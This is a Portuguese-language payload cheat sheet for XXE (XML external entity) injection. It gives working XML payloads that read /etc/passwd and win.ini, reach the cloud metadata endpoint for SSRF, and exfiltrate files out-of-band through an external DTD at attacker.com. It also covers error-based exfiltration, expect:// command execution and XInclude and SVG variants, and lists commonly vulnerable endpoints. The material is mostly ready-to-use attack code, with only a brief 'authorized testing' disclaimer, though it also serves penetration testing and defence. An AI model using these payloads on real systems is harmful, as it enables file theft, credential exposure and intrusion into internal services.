# 📄 XXE — injeção de entidades externas XML

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

> **Nota de contexto:** os excertos são exemplos ilustrativos, não documentos XML completos em todos os casos. A exploração depende do suporte e da configuração de DTD, entidades externas, XInclude e protocolos do processador XML; a leitura de ficheiros ou a execução de código não é garantida. Uma declaração de UTF-16 também exige bytes realmente codificados dessa forma. [Guia de XXE da PortSwigger](https://portswigger.net/web-security/xxe). DTD é a definição do tipo de documento; *out-of-band* significa que a interação é observada fora da resposta direta.

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗  ██╗██╗  ██╗███████╗
  ╚██╗██╔╝╚██╗██╔╝██╔════╝
   ╚███╔╝  ╚███╔╝ █████╗  
   ██╔██╗  ██╔██╗ ██╔══╝  
  ██╔╝ ██╗██╔╝ ██╗███████╗
  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
   Injeção de entidades externas XML
```

---

## 🎯 O que é XXE

Uma vulnerabilidade **XXE** explora processadores XML que resolvem referências a entidades externas, permitindo a leitura de ficheiros, SSRF e, em alguns casos, execução remota de código (RCE).

---

## 💉 Payloads básicos

### Ler ficheiros locais
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Ficheiros do Windows
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
```

### SSRF através de XXE
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/">
]>
<root>&xxe;</root>
```

---

## 🔒 XXE cego (fora de banda)

### DTD externa
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

**evil.dtd no servidor do atacante:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

### Exfiltração através de erros
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
```

---

## 🛡️ Técnicas de contorno

### Codificação
```xml
<!-- UTF-16 -->
<?xml version="1.0" encoding="UTF-16"?>

<!-- Envolvido em Base64 -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

### Variantes de protocolos
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "expect://id">
<!ENTITY xxe SYSTEM "data://text/plain,test">
```

### XInclude
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### XXE em SVG
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="0" y="20">&xxe;</text>
</svg>
```

---

## 📊 Referência rápida

| Tipo de payload | Caso de utilização |
|--------------|----------|
| Leitura de ficheiros | `SYSTEM "file:///etc/passwd"` |
| SSRF | `SYSTEM "http://internal/"` |
| Cego (fora de banda) | DTD externa e exfiltração |
| Baseado em erros | Provocar um erro que inclua os dados |

### Endpoints frequentemente vulneráveis
```
- APIs SOAP
- Carregamentos de ficheiros XML
- Processadores de SVG
- Processadores de documentos (DOCX, XLSX)
- Feeds RSS/Atom
```

---

## 📚 Recursos

- [PortSwigger XXE](https://portswigger.net/web-security/xxe)
- [PayloadsAllTheThings XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

---

<p align="center">
  <b>📄 Explore processadores XML!</b><br>
  <i>Apenas para testes autorizados!</i>
</p>
